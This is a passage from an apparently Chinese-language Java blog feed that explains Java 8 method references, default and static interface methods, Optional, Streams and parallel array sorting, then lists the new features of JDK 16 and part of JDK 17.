&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这个方法接收两个参数：</p>
<ul>
<li><code>List&lt;T&gt; list</code>：需要进行转换的集合</li>
<li><code>Function&lt;T,R&gt;</code>：函数接口，接收T类型，返回R类型。用这个函数接口对list中的元素T进行转换，变为R类型</li>
</ul>
<p>接下来，我们看具体案例：</p>
<h4 id="3-2-1-类的静态方法引用"><a href="#3-2-1-类的静态方法引用" class="headerlink" title="3.2.1 类的静态方法引用"></a>3.2.1 类的静态方法引用</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = Arrays.asList(<span class="number">1000</span>, <span class="number">2000</span>, <span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
<p>我们需要把这个集合中的元素转为十六进制保存，需要调用<code>Integer.toHexString()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toHexString</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> toUnsignedString0(i, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方法接收一个 i 类型，返回一个<code>String</code>类型，可以用来构造一个<code>Function</code>的函数接口：</p>
<p>我们先按照Lambda原始写法，传入的Lambda表达式会被编译为<code>Function</code>接口，接口中通过<code>Integer.toHexString(i)</code>对原来集合的元素进行转换：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过Lambda表达式实现</span></span><br><span class="line">List&lt;String&gt; hexList = CollectionUtil.convert(list, i -&gt; Integer.toHexString(i));</span><br><span class="line">System.out.println(hexList);<span class="comment">// [3e8, 7d0, bb8]</span></span><br></pre></td></tr></table></figure>
<p>上面的Lambda表达式代码块中，只有对<code>Integer.toHexString()</code>方法的引用，没有其它代码，因此我们可以直接把方法作为参数传递，由编译器帮我们处理，这就是静态方法引用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类的静态方法引用</span></span><br><span class="line">List&lt;String&gt; hexList = CollectionUtil.convert(list, Integer::toHexString);</span><br><span class="line">System.out.println(hexList);<span class="comment">// [3e8, 7d0, bb8]</span></span><br></pre></td></tr></table></figure>
<h4 id="3-2-2-类的非静态方法引用"><a href="#3-2-2-类的非静态方法引用" class="headerlink" title="3.2.2 类的非静态方法引用"></a>3.2.2 类的非静态方法引用</h4><p>接下来，我们把刚刚生成的<code>String</code>集合<code>hexList</code>中的元素都变成大写，需要借助于String类的toUpperCase()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toUpperCase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> toUpperCase(Locale.getDefault());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次是非静态方法，不能用类名调用，需要用实例对象，因此与刚刚的实现有一些差别，我们接收集合中的每一个字符串<code>s</code>。但与上面不同然后<code>s</code>不是<code>toUpperCase()</code>的参数，而是调用者：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过Lambda表达式，接收String数据，调用toUpperCase()</span></span><br><span class="line">List&lt;String&gt; upperList = CollectionUtil.convert(hexList, s -&gt; s.toUpperCase());</span><br><span class="line">System.out.println(upperList);<span class="comment">// [3E8, 7D0, BB8]</span></span><br></pre></td></tr></table></figure>
<p>因为代码体只有对<code>toUpperCase()</code>的调用，所以可以把方法作为参数引用传递，依然可以简写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类的成员方法</span></span><br><span class="line">List&lt;String&gt; upperList = CollectionUtil.convert(hexList, String::toUpperCase);</span><br><span class="line">System.out.println(upperList);<span class="comment">// [3E8, 7D0, BB8]</span></span><br></pre></td></tr></table></figure>
<h4 id="3-2-3-指定实例的非静态方法引用"><a href="#3-2-3-指定实例的非静态方法引用" class="headerlink" title="3.2.3 指定实例的非静态方法引用"></a>3.2.3 指定实例的非静态方法引用</h4><p>下面一个需求是这样的，我们先定义一个数字<code>Integer num = 2000</code>，然后用这个数字和集合中的每个数字进行比较，比较的结果放入一个新的集合。比较对象，我们可以用<code>Integer</code>的<code>compareTo</code>方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Integer anotherInteger)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> compare(<span class="keyword">this</span>.value, anotherInteger.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先用Lambda实现，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = Arrays.asList(<span class="number">1000</span>, <span class="number">2000</span>, <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 某个对象的成员方法</span></span><br><span class="line">Integer num = <span class="number">2000</span>;</span><br><span class="line">List&lt;Integer&gt; compareList = CollectionUtil.convert(list, i -&gt; num.compareTo(i));</span><br><span class="line">System.out.println(compareList);<span class="comment">// [1, 0, -1]</span></span><br></pre></td></tr></table></figure>
<p>与前面类似，这里Lambda的代码块中，依然只有对<code>num.compareTo(i)</code>的调用，所以可以简写。但是，需要注意的是，这次方法的调用者不是集合的元素，而是一个外部的局部变量<code>num</code>，因此不能使用 <code>Integer::compareTo</code>，因为这样是无法确定方法的调用者。要指定调用者，需要用 <code>对象::方法名</code>的方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 某个对象的成员方法</span></span><br><span class="line">Integer num = <span class="number">2000</span>;</span><br><span class="line">List&lt;Integer&gt; compareList = CollectionUtil.convert(list, num::compareTo);</span><br><span class="line">System.out.println(compareList);<span class="comment">// [1, 0, -1]</span></span><br></pre></td></tr></table></figure>
<h4 id="3-2-4-构造函数引用"><a href="#3-2-4-构造函数引用" class="headerlink" title="3.2.4 构造函数引用"></a>3.2.4 构造函数引用</h4><p>最后一个场景：把集合中的数字作为毫秒值，构建出<code>Date</code>对象并放入集合，这里我们就需要用到Date的构造函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span>   date   the milliseconds since January 1, 1970, 00:00:00 GMT.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@see</span>     java.lang.System#currentTimeMillis()</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Date</span><span class="params">(<span class="keyword">long</span> date)</span> </span>&#123;</span><br><span class="line">    fastTime = date;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以接收集合中的每个元素，然后把元素作为<code>Date</code>的构造函数参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将数值类型集合，转为Date类型</span></span><br><span class="line">List&lt;Date&gt; dateList = CollectionUtil.convert(list, i -&gt; <span class="keyword">new</span> Date(i));</span><br><span class="line"><span class="comment">// 这里遍历元素后需要打印，因此直接把println作为方法引用传递了</span></span><br><span class="line">dateList.forEach(System.out::println);</span><br></pre></td></tr></table></figure>
<p>上面的Lambda表达式实现方式，代码体只有<code>new Date()</code>一行代码，因此也可以采用方法引用进行简写。但问题是，构造函数没有名称，我们只能用<code>new</code>关键字来代替：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造方法</span></span><br><span class="line">List&lt;Date&gt; dateList = CollectionUtil.convert(list, Date::<span class="keyword">new</span>);</span><br><span class="line">dateList.forEach(System.out::println);</span><br></pre></td></tr></table></figure>
<p>注意两点：</p>
<ul>
<li>上面代码中的System.out::println 其实是 指定对象System.out的非静态方法println的引用</li>
<li>如果构造函数有多个，可能无法区分导致传递失败</li>
</ul>
<h2 id="4-默认方法和静态方法。"><a href="#4-默认方法和静态方法。" class="headerlink" title="4.默认方法和静态方法。"></a>4.默认方法和静态方法。</h2><h3 id="4-1-默认方法"><a href="#4-1-默认方法" class="headerlink" title="4.1 默认方法"></a>4.1 默认方法</h3><p>默认方法使得开发者可以在 不破坏二进制兼容性的前提下，往现存接口中添加新的方法，即不强制那些实现了该接口的类也同时实现这个新加的方法。</p>
<p>默认方法和抽象方法之间的区别在于抽象方法需要实现，而默认方法不需要。接口提供的默认方法会被接口的实现类继承或者覆写，例子代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">interface</span> <span class="title">Defaulable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Interfaces now allow default methods, the implementer may or </span></span><br><span class="line">    <span class="comment">// may not implement (override) them.</span></span><br><span class="line">    <span class="function"><span class="keyword">default</span> String <span class="title">notRequired</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Default implementation"</span>; </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultableImpl</span> <span class="keyword">implements</span> <span class="title">Defaulable</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OverridableImpl</span> <span class="keyword">implements</span> <span class="title">Defaulable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">notRequired</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Overridden implementation"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Defaulable接口使用关键字default定义了一个默认方法notRequired()。DefaultableImpl类实现了这个接口，同时默认继承了这个接口中的默认方法；OverridableImpl类也实现了这个接口，但覆写了该接口的默认方法，并提供了一个不同的实现。</p>
<h3 id="4-2-静态方法"><a href="#4-2-静态方法" class="headerlink" title="4.2 静态方法"></a>4.2 静态方法</h3><p>Java 8带来的另一个有趣的特性是在接口中可以定义静态方法，我们可以直接用接口调用这些静态方法。例子代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">interface</span> <span class="title">DefaulableFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Interfaces now allow static methods</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> Defaulable <span class="title">create</span><span class="params">( Supplier&lt; Defaulable &gt; supplier )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> supplier.get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面的代码片段整合了默认方法和静态方法的使用场景：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用接口的静态方法，并且传递DefaultableImpl的构造函数引用来构建对象</span></span><br><span class="line">    Defaulable defaulable = DefaulableFactory.create( DefaultableImpl::<span class="keyword">new</span> );</span><br><span class="line">    System.out.println( defaulable.notRequired() );</span><br><span class="line">	<span class="comment">// 调用接口的静态方法，并且传递OverridableImpl的构造函数引用来构建对象</span></span><br><span class="line">    defaulable = DefaulableFactory.create( OverridableImpl::<span class="keyword">new</span> );</span><br><span class="line">    System.out.println( defaulable.notRequired() );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码的输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Default implementation</span><br><span class="line">Overridden implementation</span><br></pre></td></tr></table></figure>
<p>由于JVM上的默认方法的实现在字节码层面提供了支持，因此效率非常高。默认方法允许在不打破现有继承体系的基础上改进接口。该特性在官方库中的应用是：给<code>java.util.Collection</code>接口添加新方法，如<code>stream()</code>、<code>parallelStream()</code>、<code>forEach()</code>和<code>removeIf()</code>等等。</p>
<p>尽管默认方法有这么多好处，但在实际开发中应该谨慎使用：在复杂的继承体系中，默认方法可能引起歧义和编译错误。如果你想了解更多细节，可以参考官方文档。</p>
<h2 id="5-Optional"><a href="#5-Optional" class="headerlink" title="5. Optional"></a>5. Optional</h2><p>Java应用中最常见的bug就是空值异常。</p>
<p><code>Optional</code>仅仅是一个容器，可以存放T类型的值或者<code>null</code>。它提供了一些有用的接口来避免显式的<code>null</code>检查，可以参考Java 8官方文档了解更多细节。</p>
<p>接下来看一点使用Optional的例子：可能为空的值或者某个类型的值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Optional&lt; String &gt; fullName = Optional.ofNullable( <span class="keyword">null</span> );</span><br><span class="line">System.out.println( <span class="string">"Full Name is set? "</span> + fullName.isPresent() );        </span><br><span class="line">System.out.println( <span class="string">"Full Name: "</span> + fullName.orElseGet( () -&gt; <span class="string">"[none]"</span> ) ); </span><br><span class="line">System.out.println( fullName.map( s -&gt; <span class="string">"Hey "</span> + s + <span class="string">"!"</span> ).orElse( <span class="string">"Hey Stranger!"</span> ) );</span><br></pre></td></tr></table></figure>
<p>如果<code>Optional</code>实例持有一个非空值，则<code>isPresent()</code>方法返回<code>true</code>，否则返回<code>false</code>；如果<code>Optional</code>实例持有<code>null</code>，<code>orElseGet()</code>方法可以接受一个lambda表达式生成的默认值；<code>map()</code>方法可以将现有的<code>Optional</code>实例的值转换成新的值；<code>orElse()</code>方法与<code>orElseGet()</code>方法类似，但是在持有null的时候返回传入的默认值，而不是通过Lambda来生成。</p>
<p>上述代码的输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Full Name is set? false</span><br><span class="line">Full Name: [none]</span><br><span class="line">Hey Stranger!</span><br></pre></td></tr></table></figure>
<p>再看下另一个简单的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Optional&lt; String &gt; firstName = Optional.of( <span class="string">"Tom"</span> );</span><br><span class="line">System.out.println( <span class="string">"First Name is set? "</span> + firstName.isPresent() );        </span><br><span class="line">System.out.println( <span class="string">"First Name: "</span> + firstName.orElseGet( () -&gt; <span class="string">"[none]"</span> ) ); </span><br><span class="line">System.out.println( firstName.map( s -&gt; <span class="string">"Hey "</span> + s + <span class="string">"!"</span> ).orElse( <span class="string">"Hey Stranger!"</span> ) );</span><br><span class="line">System.out.println();</span><br></pre></td></tr></table></figure>
<p>这个例子的输出是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">First Name is set? true</span><br><span class="line">First Name: Tom</span><br><span class="line">Hey Tom!</span><br></pre></td></tr></table></figure>
<p>如果想了解更多的细节，请参考官方文档。</p>
<h2 id="6-Streams"><a href="#6-Streams" class="headerlink" title="6. Streams"></a>6. Streams</h2><p>新增的Stream API（java.util.stream）将生成环境的函数式编程引入了Java库中。这是目前为止最大的一次对Java库的完善，以便开发者能够写出更加有效、更加简洁和紧凑的代码。</p>
<p>Steam API极大得简化了集合操作（后面我们会看到不止是集合），首先看下这个叫Task的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Streams</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">enum</span> Status &#123;</span><br><span class="line">        OPEN, CLOSED</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Task</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Status status;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Integer points;</span><br><span class="line"></span><br><span class="line">        Task( <span class="keyword">final</span> Status status, <span class="keyword">final</span> Integer points ) &#123;</span><br><span class="line">            <span class="keyword">this</span>.status = status;</span><br><span class="line">            <span class="keyword">this</span>.points = points;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">getPoints</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> points;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Status <span class="title">getStatus</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> status;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> String.format( <span class="string">"[%s, %d]"</span>, status, points );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Task类有一个points属性，另外还有两种状态：OPEN或者CLOSED。现在假设有一个task集合：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Collection&lt; Task &gt; tasks = Arrays.asList(</span><br><span class="line">    <span class="keyword">new</span> Task( Status.OPEN, <span class="number">5</span> ),</span><br><span class="line">    <span class="keyword">new</span> Task( Status.OPEN, <span class="number">13</span> ),</span><br><span class="line">    <span class="keyword">new</span> Task( Status.CLOSED, <span class="number">8</span> ) </span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>首先看一个问题：在这个task集合中一共有多少个OPEN状态的？计算出它们的points属性和。在Java 8之前，要解决这个问题，则需要使用foreach循环遍历task集合；但是在Java 8中可以利用steams解决：包括一系列元素的列表，并且支持顺序和并行处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Calculate total points of all active tasks using sum()</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">long</span> totalPointsOfOpenTasks = tasks</span><br><span class="line">    .stream()</span><br><span class="line">    .filter( task -&gt; task.getStatus() == Status.OPEN )</span><br><span class="line">    .mapToInt( Task::getPoints )</span><br><span class="line">    .sum();</span><br><span class="line"></span><br><span class="line">System.out.println( <span class="string">"Total points: "</span> + totalPointsOfOpenTasks );</span><br></pre></td></tr></table></figure>
<p>运行这个方法的控制台输出是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Total points: 18</span><br></pre></td></tr></table></figure>
<p>这里有很多知识点值得说。首先，<code>tasks</code>集合被转换成<code>steam</code>表示；其次，在<code>steam</code>上的<code>filter</code>操作会过滤掉所有<code>CLOSED</code>的<code>task</code>；第三，<code>mapToInt</code>操作基于<code>tasks</code>集合中的每个<code>task</code>实例的<code>Task::getPoints</code>方法将<code>task</code>流转换成<code>Integer</code>集合；最后，通过<code>sum</code>方法计算总和，得出最后的结果。</p>
<p>在学习下一个例子之前，还需要记住一些steams（点此更多细节）的知识点。Steam之上的操作可分为中间操作和晚期操作。</p>
<p>中间操作会返回一个新的steam——执行一个中间操作（例如filter）并不会执行实际的过滤操作，而是创建一个新的steam，并将原steam中符合条件的元素放入新创建的steam。</p>
<p>晚期操作（例如forEach或者sum），会遍历steam并得出结果或者附带结果；在执行晚期操作之后，steam处理线已经处理完毕，就不能使用了。在几乎所有情况下，晚期操作都是立刻对steam进行遍历。</p>
<p>steam的另一个价值是创造性地支持并行处理（parallel processing）。对于上述的tasks集合，我们可以用下面的代码计算所有task的points之和：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Calculate total points of all tasks</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">double</span> totalPoints = tasks</span><br><span class="line">   .stream()</span><br><span class="line">   .parallel()</span><br><span class="line">   .map( task -&gt; task.getPoints() ) <span class="comment">// or map( Task::getPoints ) </span></span><br><span class="line">   .reduce( <span class="number">0</span>, Integer::sum );</span><br><span class="line"></span><br><span class="line">System.out.println( <span class="string">"Total points (all tasks): "</span> + totalPoints );</span><br></pre></td></tr></table></figure>
<p>这里我们使用parallel方法并行处理所有的task，并使用reduce方法计算最终的结果。控制台输出如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Total points（all tasks）: 26.0</span><br></pre></td></tr></table></figure>
<p>对于一个集合，经常需要根据某些条件对其中的元素分组。利用steam提供的API可以很快完成这类任务，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Group tasks by their status</span></span><br><span class="line"><span class="keyword">final</span> Map&lt; Status, List&lt; Task &gt; &gt; map = tasks</span><br><span class="line">    .stream()</span><br><span class="line">    .collect( Collectors.groupingBy( Task::getStatus ) );</span><br><span class="line">System.out.println( map );</span><br></pre></td></tr></table></figure>
<p>控制台的输出如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;CLOSED=[[CLOSED, <span class="number">8</span>]], OPEN=[[OPEN, <span class="number">5</span>], [OPEN, <span class="number">13</span>]]&#125;</span><br></pre></td></tr></table></figure>
<p>最后一个关于tasks集合的例子问题是：如何计算集合中每个任务的点数在集合中所占的比重，具体处理的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Calculate the weight of each tasks (as percent of total points) </span></span><br><span class="line"><span class="keyword">final</span> Collection&lt; String &gt; result = tasks</span><br><span class="line">    .stream()                                        <span class="comment">// Stream&lt; String &gt;</span></span><br><span class="line">    .mapToInt( Task::getPoints )                     <span class="comment">// IntStream</span></span><br><span class="line">    .asLongStream()                                  <span class="comment">// LongStream</span></span><br><span class="line">    .mapToDouble( points -&gt; points / totalPoints )   <span class="comment">// DoubleStream</span></span><br><span class="line">    .boxed()                                         <span class="comment">// Stream&lt; Double &gt;</span></span><br><span class="line">    .mapToLong( weigth -&gt; ( <span class="keyword">long</span> )( weigth * <span class="number">100</span> ) ) <span class="comment">// LongStream</span></span><br><span class="line">    .mapToObj( percentage -&gt; percentage + <span class="string">"%"</span> )      <span class="comment">// Stream&lt; String&gt; </span></span><br><span class="line">    .collect( Collectors.toList() );                 <span class="comment">// List&lt; String &gt; </span></span><br><span class="line"></span><br><span class="line">System.out.println( result );</span><br></pre></td></tr></table></figure>
<p>控制台输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[19%, 50%, 30%]</span><br></pre></td></tr></table></figure>
<p>最后，正如之前所说，Steam API不仅可以作用于Java集合，传统的IO操作（从文件或者网络一行一行得读取数据）可以受益于steam处理，这里有一个小例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Path path = <span class="keyword">new</span> File( filename ).toPath();</span><br><span class="line"><span class="keyword">try</span>( Stream&lt; String &gt; lines = Files.lines( path, StandardCharsets.UTF_8 ) ) &#123;</span><br><span class="line">    lines.onClose( () -&gt; System.out.println(<span class="string">"Done!"</span>) ).forEach( System.out::println );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Stream的方法<code>onClose()</code> 返回一个等价的有额外句柄的Stream，当Stream的<code>close()</code>方法被调用的时候这个句柄会被执行。Stream API、Lambda表达式还有接口默认方法和静态方法支持的方法引用，是Java 8对软件开发的现代范式的响应。</p>
<h2 id="7-并行数组"><a href="#7-并行数组" class="headerlink" title="7. 并行数组"></a>7. 并行数组</h2><p>Java8版本新增了很多新的方法，用于支持并行数组处理。最重要的方法是<code>parallelSort()</code>，可以显著加快多核机器上的数组排序。下面的例子论证了parallexXxx系列的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javacodegeeks.java8.parallel.arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ThreadLocalRandom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ParallelArrays</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span>[] arrayOfLong = <span class="keyword">new</span> <span class="keyword">long</span> [ <span class="number">20000</span> ];        </span><br><span class="line"></span><br><span class="line">        Arrays.parallelSetAll( arrayOfLong, </span><br><span class="line">            index -&gt; ThreadLocalRandom.current().nextInt( <span class="number">1000000</span> ) );</span><br><span class="line">        Arrays.stream( arrayOfLong ).limit( <span class="number">10</span> ).forEach( </span><br><span class="line">            i -&gt; System.out.print( i + <span class="string">" "</span> ) );</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        Arrays.parallelSort( arrayOfLong );        </span><br><span class="line">        Arrays.stream( arrayOfLong ).limit( <span class="number">10</span> ).forEach( </span><br><span class="line">            i -&gt; System.out.print( i + <span class="string">" "</span> ) );</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述这些代码使用parallelSetAll()方法生成20000个随机数，然后使用parallelSort()方法进行排序。这个程序会输出乱序数组和排序数组的前10个元素。上述例子的代码输出的结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Unsorted: 591217 891976 443951 424479 766825 351964 242997 642839 119108 552378 </span><br><span class="line">Sorted: 39 220 263 268 325 607 655 678 723 793</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>JDK 16 新特性</title>
    <url>/Java/JDK%2016%20%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p>2021年03月16 <code>JDK 16</code> 发布，非 LTS 版本。</p>
<p><a href="http://openjdk.java.net/projects/jdk/16/" target="_blank" rel="noopener">新特性</a></p>
<ul>
<li>338:     Vector API (Incubator)</li>
<li>347:     Enable C++14 Language Features</li>
<li>357:     Migrate from Mercurial to Git</li>
<li>369:     Migrate to GitHub</li>
<li>376:     ZGC: Concurrent Thread-Stack Processing</li>
<li>380:     Unix-Domain Socket Channels</li>
<li>386:     Alpine Linux Port</li>
<li>387:     Elastic Metaspace</li>
<li>388:     Windows/AArch64 Port</li>
<li>389:     Foreign Linker API (Incubator)</li>
<li>390:     Warnings for Value-Based Classes</li>
<li>392:     Packaging Tool</li>
<li>393:     Foreign-Memory Access API (Third Incubator)</li>
<li>394:     Pattern Matching for instanceof</li>
<li>395:     Records</li>
<li>396:     Strongly Encapsulate JDK Internals by Default</li>
<li>397:     Sealed Classes (Second Preview)</li>
</ul>
<p>中文</p>
<ul>
<li>338:     提供了Vector API (jdk.incubator.vector)来用于矢量计算</li>
<li>347:     在JDK C++的源码中允许使用C++14的语言特性</li>
<li>357:     OpenJDK源码的版本控制从Mercurial (hg) 迁移到git</li>
<li>369:     将OpenJDK源码的版本控制迁移到 GitHub</li>
<li>376:     ZGC: 实现了并发thread-stack处理来降低GC safepoints的负担</li>
<li>380:     对 Socket Channels 及 Server ocket Channels的api提供对unix domain socket的支持</li>
<li>386:     将glibc的jdk移植到使用musl的alpine linux上</li>
<li>387:     支持不再使用的class metadata归还内存给操作系统，降低内存占用</li>
<li>388:     移植JDK到Windows/AArch64</li>
<li>389:     提供jdk.incubator.foreign来简化native code的调用</li>
<li>390:     提供 @jdk.internal.ValueBased 来用于标注作为value-based的类</li>
<li>392:     jpackage在JDK14引入，JDK15作为incubating工具，在JDK16转正</li>
<li>393:     Foreign-Memory Access API在JDK14首次引入作为incubating API，在JDK15处于第二轮incubating，在JDK16处于第三轮incubating</li>
<li>394:     instanceof的模式匹配在JDK14作为preview，在JDK15作为第二轮的preview，在JDK16转正</li>
<li>395:     Record类型在JDK14作为preview，在JDK15处于第二轮preview，在JDK16转正</li>
<li>396:     对内部的api进行更多的封装，鼓励开发者从使用内部的方法迁移到标准的API</li>
<li>397:     Sealed Classes在JDK15作为preview引入，在JDK16作为第二轮preview</li>
</ul>
<p>总结：JDK16相当于是将JDK14、JDK15的一些特性进行了正式引入。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>JDK 17 新特性</title>
    <url>/Java/JDK%2017%20%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p>2021年09月14 <code>JDK 17</code> 发布。这是 <code>JDK 11</code> 后的第二个长期支持版本（ 2029年9月到期 ）。</p>
<blockquote>
<p>根据最新发布的“Oracle No-Fee Terms and Conditions”（NFTC）许可，撤回了 2018 年制定的要对 Oracle JDK 收取商用费用的决定，并且不影响 Oracle OpenJDK 的发行。</p>
</blockquote>
<p><a href="http://openjdk.java.net/projects/jdk/17/" target="_blank" rel="noopener">新特性</a></p>
<ul>
<li>306:     Restore Always-Strict Floating-Point Semantics</li>
<li>356:     Enhanced Pseudo-Random Number Generators </li>
<li>382:     New macOS Rendering Pipeline </li>
<li>391:     macOS/AArch64 Port  </li>
<li>398:     Deprecate the Applet API for Removal </li>
<li>403:     Strongly Encapsulate JDK Internals JDK </li>
<li>406:     Pattern Matching for switch (Preview) </li>
<li>407:     Remove RMI Activation</li>
<li>409:     Sealed Classes </li>
<li>410:     Remove the Experimental AOT and JIT Compiler </li>
<li>411:     Deprecate the Security Manager for Removal </li>
<li>412:     Foreign Function &amp; Memory API (Incubator)</li>
<li>414:     Vector API (Second Incubator) </li>
<li>415:     Context-Specific Deserialization Filters </li>
</ul>
<p>中文</p>
<ul>
<li>306:     恢复始终执行严格模式的浮点定义</li>
<li>356:     增强型伪随机数生成器</li>
